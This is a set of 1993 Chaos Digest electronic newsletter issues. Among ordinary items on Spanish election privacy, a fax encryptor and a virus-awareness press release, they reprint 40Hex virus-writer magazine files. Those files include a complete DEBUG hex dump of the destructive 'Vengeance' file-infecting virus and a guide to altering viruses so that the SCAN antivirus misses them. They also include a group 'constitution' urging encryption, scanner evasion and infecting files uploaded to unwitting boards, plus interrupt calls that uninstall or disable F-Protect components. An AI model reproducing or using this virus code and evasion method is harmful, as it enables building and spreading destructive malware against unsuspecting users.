     "People, like a disgruntled employee who may have a gripe with
someone else, download it and spread it that way," this virus author said.

NOT LAWBREAKERS
+++++++++++++++

     The virus authors also pointed out that since the act of writing a
virus is not prohibited by law, they should not be viewed as criminals.

     The callers claimed that even if the group stopped writing viruses,
the number of infections would not decline.  The problem of viruses has
grown so large that new viruses have no impact overall, one said.

     "Our effect is fairly little," he asserted.

     The callers said that they have been writing viruses for about a
year, and would probably continue for at least another year.  Eventually,
they hope to find jobs as full time programmers, several said.

     There is no way to verify the callers' claims.  However, many of the
monikers the callers used, as well as the name "Phalcon/Skism," have shown
up in perhaps as many as half  -  about 100  -  of the viruses to appear
in the past six or seven months, said John McAfee, president of McAfee
Associates, an antivirus software publisher based in Santa Clara,Calif.

     The quality of the viruses is "mediocre," Mcafee said. (* Cant win
'em all can we, John? *)
---------------------------------------------------------------------------

My thoughts on the article was that it was neutral, Mr. Alexander could
have easily ripped us apart.  We didnt expect to come out looking like
heros, so why should we bitch.  Next month prepare for the official
transcript of the interview.  Then we can truly establish what was said.

                                            -)GHeap

------------------------------

End of Chaos Digest #1.46
************************************

Chaos Digest                Mardi 8 Juin 1993        Volume 1 : Numero 47
                             ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.47 (8 Juin 1993)
File 1--File 1--40H VMag Number 5 Volume 2 Issue 1 #005-007 (reprint)
File 2--Elections espagnoles et libertes des donnees (news)
File 3--SurFax, boitier de securisation des telecopies (produit)
File 4--_Computer Virus Awareness Day_ briefing's (communique)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 5 Volume 2 Issue 1 #005-007 (reprint)


40Hex Number 5 Volume 2 Issue 1                                  File 005

                ___________________________________________
                The Constitution of Worldwide Virus Writers
                ___________________________________________
                    Initial Release - February 12, 1992
                ___________________________________________

     We, the members of PHALCON/SKISM, in order to form a more perfect
environment worldwide for the virus community, establish justice, ensure
intracommunity tranquility, provide for the common defense and offense,
promote the general welfare, and secure the blessings of liberty to
ourselves and our posterity, do ordain and establish this Constitution of
Worldwide Virus Writers.

ARTICLE I - REGARDING ORIGINAL VIRII
     Section A - DEFINITION
          The term "original virus" herein indicates programming done
          exclusively by either one individual or group, with no code
          taken from any other source, be it a book or another virus.
     Section B - CODE REQUIREMENTS
          For an original virus to conform to the standards set by
          this document, it must include the following:
            1) The title of the virus in square brackets followed by a
               zero byte should be in the code, in a form suitable for
               inclusion into SCAN(1).  This is to ensure that the
               name of the virus is known to those examining it.
            2) The name of the author and his/her group affilition/s
               should be included in the code, followed by a zero
               byte.  At the present, this is an optional requirement.
            3) Some form of encryption or other form of stealth
               techniques must be used.  Even a simple XOR routine
               will suffice.
            4) If the virus infects files, the code should be able to
               handle infection of read only files.
            5) It must have some feature to distinguish it from other
               virii.  Creativity is encouraged above all else.
            6) The virus must not be detectable by SCAN.
     Section C - IMPLEMENTATION
          This section, and all sections hereafter bearing the heading
          "IMPLEMENTATION" refer to the recommended method of
          implementation of the suggestions/requirements listed in the
          current article.
            1) Virus_Name db '[Avocado]',0
            2) Author     db 'Dark Angel, PHALCON/SKISM',0

ARTICLE II - REGARDING "HACKED" VIRII
     Section A - DEFINITION
          The term "hacked virus" herein refers to any virus written
          by either one individual or a group which includes code
          taken from any other source, be it a book, a code fragment,
          or the entire source code from another virus.
          The term "source virus" herein refers to the virus which
          spawned the "hacked virus."
     Section B - CODE REQUIREMENTS
          For a "hacked" virus to conform to the standards set forth
          by this document, it must include the following, in addition
          to all the requirements set down in Article I of this
          document:
            1) The title, author (if available), and affiliation of
               the author (if available) of the original virus.
            2) The author of the hacked virus must give the source
               code of said virus to the author of the source virus
               upon demand.
            3) No more Jerusalem, Burger, Vienna, Stoned, and Dark
               Avenger hacks are to be written.
            4) The source virus must be improved in some manner
               (generally in efficiency of speed or size).
            5) The hacked virus must significantly differ from the
               source virus, i.e. it cannot be simply a text change.
     Section C - IMPLEMENTATION
            1) Credit db 'Source stolen from Avocado by Dark Angel of
               PHALCON/SKISM',0

ARTICLE III - REGARDING VIRAL STRAINS
     Section A - DEFINITION
          The term "viral strain" herein refers to any virus written
          by the original author which does not significantly differ
          from the original.  It generally implies a shrinking in code
          size, although this is not required.
     Section B - CODE REQUIREMENTS
          For a "viral strain" to conform to the standards set by this
          document, it must include the following, in addition to all
          the requirements set down in Article I of this document:
            1) The name of the virus shall be denoted by the name of
               the original virus followed by a dash and the version
               letter.
            2) The name of the virus must not change from that of the
               original strain.
            3) A maximum of two strains of the virus can be written.
     Section C - IMPLEMENTATION
            1) Virus_Name db '[Avocado-B]',0

ARTICLE IV - DISTRIBUTION
     Section A - DEFINITION
          The term "distribution" herein refers to the transport of
          the virus through an infected file to the medium of storage
          of a third (unwitting) party.
     Section B - INFECTION MEDIUM
          The distributor shall infect a file with the virus before
          uploading.  Suggested files include:
            1) Newly released utility programs.
            2) "Hacked" versions of popular anti-viral software, i.e.
               the version number should be changed, but little else.
            3) Beta versions of any program.
          The infected file, which must actually do something useful,
          will then be uploaded to a board.  The following boards are
          fair game:
            1) PD Boards
            2) Lamer boards
            3) Boards where the sysop is a dick
          No virus shall ever be uploaded, especially by the author,
          directly to an antivirus board, such as HomeBase or
          Excalibur.
     Section C - BINARY AND SOURCE CODE AVAILABILITY
          The binary of the virus shall not be made available until at
          least two weeks after the initial (illicit) distribution of
          the virus.  Further, the source code, which need not be made
          available, cannot be released until the latest version of
          SCAN detects the virus.  The source code, should it be made
          available, should be written in English.
     Section D - DOCUMENTATION
          Documentation can be included with the archive containing
          the binary of the virus, although this is optional.  The
          author should include information about the virus suitable
          for inclusion in the header of VSUM(2).  A simple
          description will follow, though the author need not reveal
          any "hidden features" of the virus.  Note this serves two
          purposes:
            1) Enable others to effectively spread the virus without
               fear of self-infection.
            2) Ensure that your virus gets a proper listing in VSUM.

ARTICLE V - AMENDMENTS
     Section A - PROCEDURE
          To propose an amendment, you must first contact a
          PHALCON/SKISM member through one of our member boards.
          Leave a message to one of us explaining the proposed change.
          It will then be considered for inclusion.  A new copy of the
          Constitution will then be drafted and placed on member
          boards under the filename "PS-CONST.TXT" available for free
          download by all virus writers.  Additionally, an updated
          version of the constitution will be published periodically
          in 40HEX.
     Section B - AMENDMENTS
          None as of this writing.

ARTICLE VI - MISCELLANEOUS
     Section A - WHO YOU CAN MAKE FUN OF
          This is a list of people who, over the past few years, have
          proved themselves to be inept and open to ridicule.
            1) Ross M. Greenberg, author of FluShot+
            2) Patricia (What's VSUM?) Hoffman.
            2) People who post "I am infected by Jerusalem, what do I
               do?" or "I have 20 virii, let's trade!"
            3) People who don't know the difference between a virus
               and a trojan.
            4) Lamers and "microwares puppies"
     Section B - WHO YOU SHOULDN'T DIS TOO BADLY
          This is a list of people who, over the past few years, have
          proved themselves to be somewhat less inept and open to
          ridicule than most.
            1) John McAfee, nonauthor of SCAN
            2) Dennis, true author of SCAN
     Section C - MOTIVATION
          In most cases, the motivation for writing a virus should not
          be the pleasure of seeing someone else's system trashed, but
          to test one's programming abilities.
__________
  1 SCAN is a registered trademark of McAfee Associates.
  2 VSUM is a registered trademark of that bitch who doesn't know her own
    name.

+++++

40Hex Number 5 Volume 2 Issue 1                                     File 006
----------------------------------------------------------------------------
PHALCON/SKISM Vengeance virus.                            Released  02/03/92
Stats: Non-Resident .COM infector.                        in 40Hex Vmag
       Infects files larger than 1992 bytes
       Size of the virus is about 722 bytes


Note: This Virus is dedicated to the memory of Digital Warfare BBS, which was
      online up until January 20th, 1992.  On that fateful day, the BBS
      computer was confiscated by local authorities. Hopefully the board will
      come back up, and be as good as before...

This virus activates the 20th of every month. Just for the fun of it, I'm not
going to tell you what this thing does upon activation. I will say one thing
unless you have suicidal tendencies, DON'T test it on your own machine, OR
the machine of someone you love.  It ain't pretty.  It IS destructive. (286+)
It IS noisy.  And it IS named appropriately.

Text that can be found in the virus:

                         *** Vengeance is ours! ***

                             PHALCON/SKISM '92

As of Scan 86, this virus isn't found.  Since it is based on the Violator
virus, other scanners may find it.  Oh well.

Have fun with this one, just don't run it on the 20th...  at least, not on
YOUR machine!

                        %%%% DecimatoR /PHALCON/SKISM %%%%

---------------------------------------------------------------------------
n veng.com
e 0100  EB 0F 90 90 90 90 90 90 90 90 90 90 90 90 90 90
e 0110  90 51 BA 27 03 FC 8B F2 83 C6 3D BF 00 01 B9 03
e 0120  00 F3 A4 8B F2 B8 0F FF CD 21 3D 01 01 75 03 E9
e 0130  E3 01 06 B4 2F CD 21 89 5C 33 90 8C 44 35 07 BA
e 0140  92 00 90 03 D6 B4 1A CD 21 90 06 56 8E 06 2C 00
e 0150  BF 00 00 5E 56 83 C6 43 AC B9 00 80 F2 AE B9 04
e 0160  00 AC AE 75 EE E2 FA 5E 07 89 7C 4E 8B FE 83 C7
e 0170  52 8B DE 83 C6 52 8B FE EB 3D 83 7C 4E 00 75 03
e 0180  E9 3F 01 1E 56 26 8E 1E 2C 00 90 8B FE 90 26 8B
e 0190  75 4E 90 83 C7 52 90 90 AC 90 3C 3B 90 74 0B 90
e 01A0  3C 00 74 03 AA EB F0 BE 00 00 5B 1F 89 77 4E 80
e 01B0  FD 5C 74 03 B0 5C AA 89 7F 50 8B F3 83 C6 48 B9
e 01C0  06 00 F3 A4 8B F3 B4 4E BA 52 00 03 D6 B9 03 00
e 01D0  CD 21 EB 04 B4 4F CD 21 73 02 EB 9E 8B 84 A8 00
e 01E0  24 1C 3C 1C 74 EE 81 BC AC 00 2D F7 77 E6 81 BC
e 01F0  AC 00 C8 07 72 DE 8B 7C 50 56 81 C6 B0 00 AC AA
e 0200  3C 00 75 FA 5E B8 00 43 BA 52 00 03 D6 CD 21 89
e 0210  4C 3B B8 01 43 83 E1 FE BA 52 00 03 D6 CD 21 B8
e 0220  02 3D BA 52 00 03 D6 CD 21 73 03 E9 87 00 8B D8
e 0230  B8 00 57 CD 21 89 4C 37 89 54 39 B4 2C CD 21 B4
e 0240  3F B9 03 00 BA 3D 00 03 D6 CD 21 72 53 3D 03 00
e 0250  75 4E B8 02 42 B9 00 00 BA 00 00 CD 21 72 41 8B
e 0260  C8 2D 03 00 89 44 41 81 C1 16 03 8B FE 81 EF 14
e 0270  02 89 0D B4 40 B9 D3 02 8B D6 81 EA 16 02 CD 21
e 0280  72 1E 3D D3 02 75 19 B8 00 42 B9 00 00 BA 00 00
e 0290  CD 21 72 0C B4 40 B9 03 00 8B D6 83 C2 40 CD 21
e 02A0  8B 54 39 8B 4C 37 83 E1 E0 83 C9 1C B8 01 57 CD
e 02B0  21 B4 3E CD 21 B8 01 43 8B 4C 3B BA 52 00 03 D6
e 02C0  CD 21 1E B4 1A 8B 54 33 8E 5C 35 CD 21 1F B4 2A
e 02D0  CD 21 80 FA 14 75 3E B4 09 8B D6 83 C2 00 CD 21
e 02E0  BA 80 00 32 ED B4 05 CD 13 80 FE 01 74 04 FE C6
e 02F0  EB F3 80 FD 20 74 06 32 F6 FE C5 EB E8 80 FA 81
e 0300  74 06 B2 81 32 F6 EB DB B8 09 25 CD 21 B4 02 B2
e 0310  07 CD 21 EB F8 59 33 C0 33 DB 33 D2 33 F6 BF 00
e 0320  01 57 33 FF C2 FF FF 0D 0A 2A 2A 2A 20 56 65 6E
e 0330  67 65 61 6E 63 65 20 69 73 20 6F 75 72 73 21 20
e 0340  2A 2A 2A 0D 0A 24 20 53 4B 49 53 4D 2F 50 68 61
e 0350  6C 63 6F 6E 20 27 39 32 20 24 00 00 00 00 00 00
e 0360  00 00 00 00 CD 20 90 E9 00 00 50 41 54 48 3D 2A
e 0370  2E 43 4F 4D 00 00 00 00 00 00 00 00 00 00 00 00
e 0380  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0390  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03E0  00 00 00 00
rcx
03E3
w
q

+++++

40Hex Number 5 Volume 2 Issue 1                                    File 007

                HOW TO MODIFY A VIRUS SO SCAN WON'T CATCH IT
                                PART II


In Issue 1 of 40Hex, Hellraiser presented a simple (though incredibly
tedious) method of searching for scan strings.  In short, this was his
method:

  1) Make a small carrier file.
  2) Infect the carrier with the virus.
  3) Fill parts of the virus with a dummy value until you isolate the
     scan string.
  4) Modify the virus so it is not detectable, i.e. switch the order of
     the instructions.

The problem is, of course, that step 3 takes a maddeningly inordinate
amount of time.  I shall present a tip which will save you much time.
The trick is, of course, to find out where the encryption mechanism and
hence the unencrypted portion where the scan string is usually located.
Once the encryption mechanism is located, isolating the scan string is
much simpler.

Of course, the problem is finding the encryption mechanism in the first
place.  The simplest method of doing this is using V Communication's
Sourcer 486, or any similar dissassembler.  Dissassemble the file and
search for the unencrypted portions.  Most of the file will be DBs, so
search for any part which isn't.  Once you have located those parts, all
you have to do is subtract 100h from the memory location to find its
physical offset in the file.  You now have a general idea of where the
scan string is located, so perform step 3 until you find it.

Ack, you say, what if you don't have Sourcer?  Well, all is not lost.
Load up the infected carrier in good old DEBUG.  The first instruction
(in COM infections) should be a JMP.  Trace (T) into the JMP and you
should be thrown into the area around the encryption mechanism.  Use the
memory offset (relative to the PSP segment) and subtract 100h to find
the physical location of the unencrypted portion in the file.  Once
again, once you have this, perform step 3.  Simple, no?

Sometimes, SCAN looks for the writing portion of the code, which
generally calls INT 21h, function 40h.  This is usually, though not
always, located somewhere near the encryption mechanism.  If it is
not near there, all you have to do is trace through the virus until
it calls the write file function.

Another method of looking for scan codes is to break the infected carrier
file into a series of 50 byte overlapping chunks.  For example, the first
chunk would be from offset 0 to 49, the second from 24 to 74, the third
from 49 to 99, etc.  Then use SCAN to see which chunk holds the scan code.
This is by far the easiest, not to mention quickest, method.

One side note on step 1, making the carrier file.  Some virii don't
infect tiny files.  What you must do is create a larger file (duh).
Simply assemble the following two lines:

    int 20h
    db  98 dup (0)

(with all the garbage segment declarations and shit, of course) and
you'll have a nice 100 byte carrier which should be sufficient in most
cases, with maybe the exception of the Darth Vaders.

Enjoy!
                                                               Dark Angel

------------------------------

Date: Mon Jun  7 22:05:44 -0100 1993
From: rfcalvo@guest2.atimdr.es (Rafael Fernandez Calvo )
Subject: File 2--Elections espagnoles et libertes des donnees (news)


    CCCCC  LL     II
   CC      LL     II
   CC      LL     II    --  N E W S   FROM   S P A I N  --- June 7, 1993
    CCCCC  LLLLLL II

 COMMISSION for LIBERTIES
 and INFORMATICS (*)

         PRIVACY AND GENERAL ELECTIONS: TRICKS OF THE TRADE
         ++++++++++++++++++++++++++++++++++++++++++++++++++

     Spain held general parlamentary elections yesterday, June 6th.
Regardless of the ocutcome (the ruling Socialist Party obtained again
a majority of the seats), one of the parties participating in the
event, "Centrist Unity-Spanish Democratic Party", was expelled of the
race on June 1 by the Electoral Control Committee on the grounds that
the party was actually a sham put up by a group of direct marketing
pirates. It is not the first time it happens but it is the first time
corrective actions are taken again such violations.

     Regardless of the fact that this party had no choice whatsoever
of winning a single seat, it showed again one of the problems
that has been plaguing citizens' privacy in Spain since 1977 (first
democratic elections after forty years of dictatorship): the use for
commercial purposes of the magnetic tapes containing the Election
Census, provided to the parties by the Public Administration.

     Big parties do not seem to have participated in data smuggling
practices but there is evidence that many of the companies that process
the tapes provided by them are the main source of abuse against the
privacy of citizens in regard to their personal data in Spain, since they
duplicate and sell the tapes. This fact has been frequently dennounced by
CLI (*).

     The recently approved Personal Data Law could help to stop these
practices.

* SOME WORDS ABOUT CLI

     The --Commission for Liberties and Informatics, CLI-- is an independent
and pluralistic organization that was officially constituted in April'91.

     Its mission is to "promote the development and protection of citizens'
rights, specially privacy, against misuse of Information Technologies".

     As of May '93, CLI is composed by nine organizations, with a joint
membership of about 3,000,000 people. They cover a very wide spectrum of
social interest groups: associations of computer professionals, judges,
civil rights leagues, trade unions, consumers groups, direct marketing
industry, etc.

     CLI is confederated with similar bodies created in some other Spanish
Regions such as Valencia, Basque Country and Catalonia, and has fluid
working relationships with many public and private Data Protection bodies
and entities all over the world, including CNIL, CPSR and Privacy
International.

     CLI has its headquarters in:

Padilla 66, 3 dcha.
E-28006 Madrid, Spain

Phone: (34-1) 402 9391
Fax: (34-1) 309 3685
E-mail: rfcalvo@guest2.atimdr.es

------------------------------

Date: Tue Jun  8 06:06:17 EDT 1993
From: celma_s@epita.fr (Samuel Celma )
Subject: File 3--SurFax, boitier de securisation des telecopies (produit)


                                SURFAX

         High Security Encryption System for Facsimile Communication


* Connected between any GIII facsimile equipment and the telephone line;
* Use a high performance crypto algorithm (2'(59) = 10'(18) possible
  cipher keys);
* Designed for finance, commercial and industrial operations;
* very easy and friendly handling.

SurFax, used on both side of the PSTN with group 3 fax, provides security
for all the transmitted documents.

Installation
+------------

  +-----+    +--------+         +--------1         +--------+    +-----+
  | Fax |====| Surfax |=====>   |  PSTN  |   <=====| Surfax |====| Fax |
  +-----+    +--------+         +--------+         +--------+    +-----+

Simply plugin and add-on
No modification required to the fax equipment


Operation
+---------

10-key keyboard
16 digits LCD display
Secret key handling with keyboard
Plain mode / encryption mode selectable with keyboard and hardkey
Dimensions: 16 x 20 x 12 cm
Weight: approx. 1.3 kg
Power: 110/200 VAC, 50/60 Hz


Facsimile Technical Specifications
+----------------------------------

Two facsimile modems
Transmission speed: 9600/7200/4800/2400 bit/s
                    (CCITT V29, V27ter, V21)
Designed to work with Group III facsimile equipments
Fully compatible for transmission to non-crypto fax equipment (T30 protocol)


Security Features
+-----------------

SurFax is a secret key system type.

(1) KEY MANAGEMENT

The system has an integrated key management.  The user has to enter his 8
figures secret key on keyboard.  A physical key allows the user to let
Surfax in the chosen mode (plain or cipher).

     Otherwise, secret key can be erased at any time at the touch of a button,
and is automatically erased after each communication.  A 32-bit session key is
generated by a "built-in" random number generator.

     Both secret and session keys are combined into a cypher key (2'(59)
possible values) on each terminal.  Both secret and session keys are never
transferred in clear between the two terminals.  A new cypher key is created
for each transmitted page.  Closed user groups can be created by request to
the manufacturer (by setting a customer specific parameter).

(2) CIPHER TECHNOLOGY

The K.E.A. (KTT Encryption Algorithm) is KTT proprietary.  It is a realtime
data ciphering process and is used to encrypt only the facsimile data.

     It is based on a random generator, which initial state relies on a cipher
key, issued from a secret key and a session key (2'(59)).


More informations
+-----------------

Mr David COHEN
SKTT Henry Kam Technologies & Telecommunations
2d rue de l'Epine Prolongee
93541 Bagnolet Cedex
Phone: +33 1 42 87 54 00
Fax:   +33 1 42 87 23 91

------------------------------

Date: Tue Jun  8 06:06:17 EDT 1993
From: ae446@freenet.carleton.ca (Nigel Allen )
Subject: File 4--_Computer Virus Awareness Day_ briefing's (communique)


Press Release
from the National Computer Security Association.

Rep. Fields to sponsor Computer Virus Awareness Day briefing;
Rep. Markey to speak to NCSA
 To: Assignment Desk, Daybook Editor
 Contact: Larry Teien of 3M Data Storage Products, St. Paul, Minn.,
          612-736-5961, or
          Bob Bales of the National Computer Security Association,
          Carlisle, Pa., 717-258-1816, or
          Ken Greenberg of Fleishman-Hillard Inc., Los Angeles,
          213-629-4974

News Advisory:

WHAT:     National Computer Virus Awareness Day

          Congressional briefing on the virus threat and recommended
          remedial action, sponsored by Rep. Jack Fields (R-Texas),
          ranking Republican on the House Subcommittee on
          Telecommunications and Finance; and an informational
          exhibit about computer virus control and information
          security.

WHERE:    Rayburn House Office Building, Washington, D.C.,
          Room 2257

WHEN:     Wednesday, June 9

          8:30 a.m. to 9:30 a.m. -- Panelist presentations
          9:30 a.m. to 10:30 a.m. -- Media Q&A

WHO:      Co-sponsored by 3M Co. and the National Computer Security
          Association (NCSA).  Endorsed by the American Electronics
          Association, the Electronic Industries Association and the
          Microcomputer Managers Association.

          Panel members to include representatives of NYNEX,
          Rockwell International and the Departments of Justice
          and Defense, as well as 3M and NCSA.

ALSO:     3M/NCSA Congressional dinner, featuring Rep. Edward J.
          Markey (D-Mass.), chairman of the House Subcommittee
          on Telecommunications and Finance.

          Cotillion Room, Sheraton Washington Hotel
          2660 Woodley Road N.W.; 7:45 p.m. on June 10
--
Nigel Allen, Toronto, Ontario, Canada  ae446@freenet.carleton.ca

------------------------------

End of Chaos Digest #1.47
************************************

Chaos Digest              Mercredi 9 Juin 1993        Volume 1 : Numero 48
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.48 (9 Juin 1993)
File 1--40H VMag Number 6 Volume 2 Issue 2 #000-004 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 6 Volume 2 Issue 2 #000-004 (reprint)


40Hex Number 6 Volume 2 Issue 2                                     File 000


    Welcome to 40Hex issue 6.  If this is your first time reading an issue of
40 Hex, I welcome you, but recommend that you start with an earlier issue.
This issue will have a Virus Spotlite on Creeping Death(Dir-2).  It isn't in
the normal Hex Dump format, and it is fully commented.

- Landfill is temporarily down(again!).  This is due to several [NuKEd]
  hard drive controllers... we are down but NOT out. Hopefully we should be
  up within several weeks of the release of this issue.  Hellraiser is still
  unable to edit the magazine, hopefully next issue he will be back in
  charge.

- I think we must discuss one problem.  Recently, we have been verbally
  "attacked" by some lamers in the virus scene who like to jerk off on
  Fidonet.  To clear up the issue at hand, we personally don't use all of
  the methods found in the articles.  For example, we don't sit around all
  day and PKLite infected files and then remove the PKLite header.  We let
  you people do it.  As a matter of fact, we made it a hell of a lot easier
  due to this month's article called NoLite.  No self-respecting virus
  group would do it.  Not everyone that reads this magazine is a virus
  programmer, but wants to learn.  Ya gotta start somewhere.  Another person
  who has been insulting us on FidoNet is Sara Gordon.  I do not know the
  whole story behind her hatred, but I know it stems from a phone
  conversation between her and Hellraiser.  From what I understand, they
  disagreed on many topics, and HR may have gotten insulting (I don't
  know the whole story)

- Anyone that would like to submit articles feel free to do so, as long as
  what you write is not stolen from another source and is of good quality.
  If you would like to write articles contact any PHALCON/SKISM member or
  upload them to either Digital Warfare or PHUN LINE.



                         40 Hex Mag Issue 6
                             April 1992

                            The Contents

File 000...........................You Are Here
File 001...........................Finding anti-viral programs in memory
File 002...........................Code Concealing: Part I
File 003...........................More Busts and Updates
File 004...........................The NoLite Utility
File 005...........................PHALCON/SKISM Update
File 006...........................Some Dick who wants to bust virus authors
File 007...........................The Kennedy Virus
File 008...........................Cornell students nailed for viruses
File 009...........................The Truth Behind Virus Scanners
File 00A...........................Virus Spotlite-Dir2 Full commented source
File 00B...........................Scan strings, and how to avoid them
File 00C...........................!Virus Contest!

Our Members:
          Axiom Codex(*)-(Sysop of PHUNLINE)
          Count Zero(*)-(Hacker, Amiga Programmer, Master of 150#)
          CRoW MeiSTeR(K)-(Sysop of Crow Tech., Goob)
          Dark Angel-(Programmer, Master Chef)
          DecimatoR(*)-(Sysop of Digital Warfare, Programmer)
          Demogorgon-(Hacker, Programmer)
          Garbageheap-(Fearless Leader, Sysop of LandFill, Programmer)
          Hellraiser-(Fearless Leader, Programmer)
          Instigator(*)-(Terry Oakes' butt-buddy, 40 Hex writer)
          Joshua Tower-(Electronics, MonkeyWrenching)
          Lazarus Long-(Programmer)
          Night Crawler-(Courier, Keeper of All Virii)
          Orion Rogue-(Rouge?, named us, then laid back, and relied on name)
          Paragon Dude-(Macintosh Progammer(lonely))
          Renegade(*?)-(Hacker, Macintosh Programmer)
          Time Lord(*)-(Sysop of USSR Systems)

          (*)-Denotes persons who should avoid bending over for the soap,
               and invest in large quantities of KY Jelly.
          (K)-Denotes persons who should get KY Jelly anyway.
          (*?)-Denotes persons who came too close, and wisely backed off
               and also saved a fortune on KY Jelly.

Special Goodbye's to:Piff'(Sorry ya had to quit)

Greets to: Attitude Adjuster, Dekion, Loki, [NuKE], Suicidal Maniac, and our
           readers (do we have any?!?!?)

P.S.  The transcript of the Alliance mentioned in last issue will NOT be
released in this issue.  This issue is just too damned packed to add another
large file.  It will be put into 40Hex-7, if we aren't in jail.

                                                -)GHeap

+++++

40Hex Number 6 Volume 2 Issue 2                                    File 001

--------------------------------------------------------------------------
                    Memory Resident Anti-Virus Detection
                              and Removal
--------------------------------------------------------------------------

Here is a list of ways to see if anti-viral utils are present in memory.
I got the list out of PC interupts, a book by Ralph Brown.  Here they are:

F.-DRIVER.SYS (Part of the F-Protect virus package by Fridrik Skulason.)
              This program "grabs" the INT 21 monitoring code, if it was not
              already taken by another program.
              INT 21h, Function 4Bh, Sub Function EEh
              AX must = 4BEEh at call, and call returns AX=1234h if F-Prot
              sucessfully grabbed INT 21, and AX=2345h if the grab failed.

F-DLOCK.SYS  (A HD access restrictor, part of F-Protect Package)
              Call INT 2Fh, Funct. 46h, SubFunct 53h
              At call, AX must = 4653h, CX=0005h, BX= 0000h
              If present in ram, AX will return FFFFh.  To uninstall, call
              with AX & CX the same as above, but BX= 0001h.  AX, ES, & BX
              will be destroyed.

F-LOCK.EXE  (Part of F-Protect package, looks for "suspicious" activity)
            INT 2Fh, Funct 46h, SubFunct. 53h
            To call:  AX = 4653h, CX=0002h, BX=0000h (installation check)
                                            BX=0001h (uninstall)
                                            BX=0002h (disable v1.08 & below)
                                            BX=0003h (enable v1.08 & below)
            Call returns AX=FFFFh if installed ( BX=0000h at call)
            AX, BX, and ES destroyed, if uninstalled (BX=0001 at call)

F-POPUP.EXE (Pop up menu for F-Protect)
          INT 2Fh, Funct. 46h, SubFunct. 53h
          To call: AX=4653h, CX=0004h, BX= 0000h, 0001h or 0002h
                                       (See above - BX same as F-Lock)
          Returns: Same as F-LOCK.EXE

F-XCHK.EXE (Prevents execution of any progs which don't have self-checking
            code added by F-XLOCK)
           INT 2Fh, Funct. 46h, SubFunct 53h
           To Call: Registers = same as F-Popup, except CX=0003h, and
                    BX = 0000h (installation check) or 0001h (uninstall)
           Returns: same as F-LOCK, above.

